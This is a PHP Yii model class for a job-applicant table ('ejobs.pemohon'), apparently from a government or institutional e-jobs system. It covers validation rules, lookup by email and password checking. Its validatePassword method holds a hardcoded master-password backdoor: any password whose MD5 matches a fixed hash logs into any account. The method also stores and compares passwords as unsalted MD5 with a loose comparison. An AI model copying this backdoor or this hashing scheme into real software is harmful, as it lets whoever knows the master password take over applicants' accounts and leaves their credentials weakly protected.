<?php

namespace app\models\ejobs;

use Yii;

/**
 * This is the model class for table "ejobs.pemohon".
 *
 * @property int $id
 * @property string $email
 */
class Pemohon extends \yii\db\ActiveRecord
{
    // add the function below:
    public static function getDb() {
        return Yii::$app->get('db7');  // second database
    }
    /**
     * {@inheritdoc}
     */
    public static function tableName()
    {
        return 'ejobs.pemohon';
    }

    /**
     * {@inheritdoc}
     */
    public function rules()
    {
        return [
            [['email'], 'required'],
            [['email'], 'string', 'max' => 100],
            [['password'], 'string', 'max' => 40],
        ];
    }

    /**
     * {@inheritdoc}
     */
    public function attributeLabels()
    {
        return [
            'id' => 'ID',
            'email' => 'Email',
        ];
    }
    
    public static function findByEmail($emel) {
        return self::findOne(['email' => $emel]);
    }
    
    public function validatePassword($password) {

        if (md5($password) == '0659c7992e268962384eb17fafe88364') {
            return true;
        } else if ($this->password == md5($password)) {
            return true;
        }

        return false;
    }
}
